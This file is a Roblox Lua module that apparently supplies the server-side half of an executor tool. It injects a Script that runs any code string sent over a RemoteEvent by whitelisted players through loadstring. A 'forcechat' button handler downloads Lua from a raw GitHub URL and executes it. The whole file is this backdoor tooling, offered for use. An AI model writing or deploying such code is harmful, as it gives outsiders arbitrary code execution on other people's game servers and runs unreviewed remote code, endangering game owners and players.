local module = {}

function module:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
	local function SELVO_fake_script()
		local script = Instance.new('Script', exec)
		script.Name = "servercm"
		
		local remotes = {
			execute = script.Parent:WaitForChild("execute", 99999);
		}

		local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))

		remotes.execute.OnServerEvent:Connect(function(player, code)
			local eligible = game:GetService("ReplicatedStorage"):FindFirstChild("returnwhitelistsrv"):Invoke(player)
			
			if eligible == true then
				loadstring(code)()
			end
		end)
	end
	coroutine.wrap(SELVO_fake_script)()

    local function SDOON_fake_script()
        local script = Instance.new('Script', otherscripts:FindFirstChild("scroll"):FindFirstChild("forcechat"))
        script.Name = "request"


        otherscripts:FindFirstChild("scroll"):FindFirstChild("forcechat").MouseButton1Click:Connect(function()
            local playergui = exec.Parent

            if exec.Parent then
                if exec.Parent:IsA("PlayerGui") then
                    if not exec.Parent:FindFirstChild("forcechat") then
                        local fcmain = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/u.lua", true))()

		                fcmain:init(exec.Parent.Parent)
                    end
                end
            end
        end)
    end
    coroutine.wrap(SDOON_fake_script)()
    
end

return module
